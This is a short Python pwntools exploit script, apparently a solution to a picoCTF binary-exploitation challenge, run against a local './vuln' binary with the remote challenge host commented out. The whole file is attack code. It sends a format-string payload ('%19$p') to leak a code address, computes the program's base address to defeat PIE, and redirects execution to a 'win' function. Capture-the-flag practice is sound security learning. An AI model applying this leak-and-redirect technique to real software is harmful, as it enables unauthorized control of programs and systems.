from pwn import *


# pr = remote('rescued-float.picoctf.net',63600)
pr = process('./vuln')
elf = ELF('./vuln')

pr.sendlineafter(b'name:',b'%19$p' )


main_pl = int(pr.recvline().strip(),16)
offset_man_pl = 0x0000000000001441
log.info(f'main_pl: {hex(main_pl)}')

base_addr = main_pl - offset_man_pl
log.info(f'base_addr: {hex(base_addr)}')

win_addr = base_addr + elf.symbols['win']
log.info(f'win_addr: {hex(win_addr)}')

# gdb.attach(pr)


pr.sendlineafter(b': ',hex(win_addr))

print(pr.recvall().decode())
pr.interactive()